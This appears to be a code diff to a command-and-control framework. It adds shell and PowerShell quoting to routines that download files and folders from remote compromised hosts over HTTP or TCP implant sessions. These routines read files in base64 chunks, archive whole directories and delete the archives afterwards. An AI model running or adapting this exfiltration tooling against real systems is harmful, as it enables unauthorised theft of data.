@@ -8,6 +8,7 @@ import threading
 from core import utils
 from core.session_handlers import session_manager, sessions
 from core.utils import defender
+from core.utils_shell_quoting import shq, psq
 from core.session_handlers.sessions import SessionManager
 
 # Command Execution Imports
@@ -628,7 +629,7 @@ def download_file_http(sid, remote_file, local_file, op_id="console"):
 			return"""
 
 		# Step 1: Get file size via HTTP‐C2
-		size_output = http_exec(sid, f"stat -c %s {remote_file}", op_id=op_id)
+		size_output = http_exec(sid, f"stat -c %s {shq(remote_file)}", op_id=op_id)
 		logger.debug(brightyellow + f"SIZE OUTPUT: {size_output}")
 		try:
 			file_size = int(size_output.strip())
@@ -650,7 +651,7 @@ def download_file_http(sid, remote_file, local_file, op_id="console"):
 				chunk_output = session.output_queue.get()"""
 
 				# Step 2: Fetch each chunk via HTTP-C2
-				chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
+				chunk_cmd = f"tail -c +{offset + 1} {shq(remote_file)} | head -c {CHUNK_SIZE} | base64"
 				chunk_output = http_exec(sid, chunk_cmd, op_id=op_id)
 
 				try:
@@ -705,7 +706,7 @@ def download_file_http(sid, remote_file, local_file, op_id="console"):
 
 		# Step 1: Get file size
 		size_cmd = (
-		f"$s=(Get-Item \"{remote_file}\").Length;"
+		f"$s=(Get-Item {psq(remote_file)}).Length;"
 		f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
 		)
 
@@ -749,7 +750,7 @@ def download_file_http(sid, remote_file, local_file, op_id="console"):
 
 				# Step 2: Read chunk using PowerShell and base64 encode it
 				chunk_cmd = (
-					f"$fs = [System.IO.File]::OpenRead(\"{remote_file}\");"
+					f"$fs = [System.IO.File]::OpenRead({psq(remote_file)});"
 					f"$fs.Seek({offset},'Begin') > $null;"
 					f"$buf = New-Object byte[] {CHUNK_SIZE};"
 					f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
@@ -841,15 +842,15 @@ def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
 	if "windows" in os_type:
 		remote_zip = f"{remote_dir}.zip"
 		# 1) create an empty zip if needed (no output)
-		cmd = ("if(-Not (Test-Path \"{0}\"))"
-			"{{ Set-Content \"{0}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)) }}").format(remote_zip)
+		cmd = (f"if(-Not (Test-Path {psq(remote_zip)}))"
+			f"{{ Set-Content {psq(remote_zip)} ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)) }}")
 
 		http_exec(sid, cmd, output=False, op_id=op_id)
 
 		# 2) copy the folder contents into it via .NET
 		zip_cmd = (
 			"[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null; "
-			f"[IO.Compression.ZipFile]::CreateFromDirectory(\"{remote_dir}\",\"{remote_zip}\","
+			f"[IO.Compression.ZipFile]::CreateFromDirectory({psq(remote_dir)},{psq(remote_zip)},"
 			"[IO.Compression.CompressionLevel]::Optimal,$false)"
 		)
 
@@ -859,8 +860,8 @@ def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
 
 		# 2a) wait until the zip actually exists on the remote
 		check_ps = (
-			f"if (Test-Path \"{remote_zip}\") "
-			"{{ Write-Output 'EXISTS' }} else {{ Write-Output 'NOPE' }}"
+			f"if (Test-Path {psq(remote_zip)}) "
+			"{ Write-Output 'EXISTS' } else { Write-Output 'NOPE' }"
 		)
 
 		print(brightyellow + "[*] Waiting for remote archive to appear…")
@@ -913,7 +914,7 @@ def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
 		os.remove(local_zip)
 
 		# 5) cleanup remote zip (no output)
-		cleanup_cmd = f"Remove-Item \"{remote_zip}\" -Force"
+		cleanup_cmd = f"Remove-Item {psq(remote_zip)} -Force"
 		http_exec(sid, cleanup_cmd, output=False, op_id=op_id)
 
 		print(brightgreen + "[+] Extraction complete")
@@ -922,7 +923,7 @@ def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
 		remote_tar = f"/tmp/{base}.tar.gz"
 
 		print(brightyellow + f"[*] Archiving remote folder {remote_dir} → {remote_tar}…")
-		cmd = f"tar czf \"{remote_tar}\" -C \"{remote_dir}\" ."
+		cmd = f"tar czf {shq(remote_tar)} -C {shq(remote_dir)} ."
 		
 		try:
 			b64_cmd = base64.b64encode(cmd.encode()).decode()
@@ -961,7 +962,7 @@ def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
 		except Exception as e:
 			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup: {e}")
 
-		cmd = f"rm -rf \"{remote_tar}\""
+		cmd = f"rm -f {shq(remote_tar)}"
 
 		try:
 			b64_cmd = base64.b64encode(cmd.encode()).decode()
@@ -986,15 +987,15 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 		remote_zip = f"{remote_dir}.zip"
 		# create empty zip
 		cmd = (
-			f"\"if(-Not (Test-Path \"{remote_zip}\"))"
-			f"{{Set-Content \"{remote_zip}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))}}\""
+			f"if(-Not (Test-Path {psq(remote_zip)}))"
+			f"{{Set-Content {psq(remote_zip)} ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))}}"
 		)
 		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)
 
 		# COM copy into zip
 		zip_cmd = (
 			"[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null; "
-			f"[IO.Compression.ZipFile]::CreateFromDirectory(\"{remote_dir}\",\"{remote_zip}\","
+			f"[IO.Compression.ZipFile]::CreateFromDirectory({psq(remote_dir)},{psq(remote_zip)},"
 			"[IO.Compression.CompressionLevel]::Optimal,$false)"
 		)
 
@@ -1002,8 +1003,8 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)
 
 		check_ps = (
-			f"if (Test-Path \"{remote_zip}\") "
-			"{{ Write-Output 'EXISTS' }} else {{ Write-Output 'NOPE' }}"
+			f"if (Test-Path {psq(remote_zip)}) "
+			"{ Write-Output 'EXISTS' } else { Write-Output 'NOPE' }"
 		)
 
 		try:
@@ -1063,7 +1064,7 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 		except Exception as e:
 			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup stage: {e}")
 
-		cmd = f"Remove-Item \"{remote_zip}\" -Force"
+		cmd = f"Remove-Item {psq(remote_zip)} -Force"
 		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)
 
 		print(brightgreen + "[+] Extraction complete")
@@ -1072,7 +1073,7 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 		remote_tar = f"/tmp/{base}.tar.gz"
 
 		print(brightyellow + f"[*] Archiving remote folder {remote_dir} → {remote_tar}…")
-		cmd = f"tar czf \"{remote_tar}\" -C \"{remote_dir}\" ."
+		cmd = f"tar czf {shq(remote_tar)} -C {shq(remote_dir)} ."
 		
 		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)
 
@@ -1105,7 +1106,7 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 		except Exception as e:
 			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup stage: {e}")
 
-		cmd = f"rm -rf \"{remote_tar}\""
+		cmd = f"rm -f {shq(remote_tar)}"
 		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)
 
 		print(brightgreen + "[+] Extraction complete")
@@ -1129,7 +1130,7 @@ def download_file_tcp(sid, remote_file, local_file):
 		print(brightyellow + f"[*] Downloading file from {host} in chunks over TCP...")
 
 		# Step 1: Get file size
-		size_cmd = f"stat -c %s {remote_file}"
+		size_cmd = f"stat -c %s {shq(remote_file)}"
 		client_socket.sendall((size_cmd + "\n").encode())
 
 		file_size_raw = b""
@@ -1169,7 +1170,7 @@ def download_file_tcp(sid, remote_file, local_file):
 		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
 			for i in range(total_chunks):
 				offset = i * CHUNK_SIZE
-				chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
+				chunk_cmd = f"tail -c +{offset + 1} {shq(remote_file)} | head -c {CHUNK_SIZE} | base64"
 				client_socket.sendall((chunk_cmd + "\n").encode())
 
 				chunk_data = b""
@@ -1228,14 +1229,14 @@ def download_file_tcp(sid, remote_file, local_file):
 		try:
 			# Get file size
 			size_cmd = (
-				f"$s=(Get-Item \"{remote_file}\").Length;"
+				f"$s=(Get-Item {psq(remote_file)}).Length;"
 				f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
 			)
 			client_socket.sendall((size_cmd + "\n").encode())
 			raw_size = client_socket.recv(4096).decode()
 			size_str = bytes([int(x) for x in raw_size.strip().split(",")]).decode()
 			file_size = int(size_str.strip())
-			
+
 
 		except Exception as e:
 			print(brightred + f"[-] Failed to get file size: {e}")
@@ -1250,7 +1251,7 @@ def download_file_tcp(sid, remote_file, local_file):
 			for i in range(total_chunks):
 				offset = i * CHUNK_SIZE
 				chunk_cmd = (
-					f"$fs = [System.IO.File]::OpenRead(\"{remote_file}\");"
+					f"$fs = [System.IO.File]::OpenRead({psq(remote_file)});"
 					f"$fs.Seek({offset},'Begin') > $null;"
 					f"$buf = New-Object byte[] {CHUNK_SIZE};"
 					f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
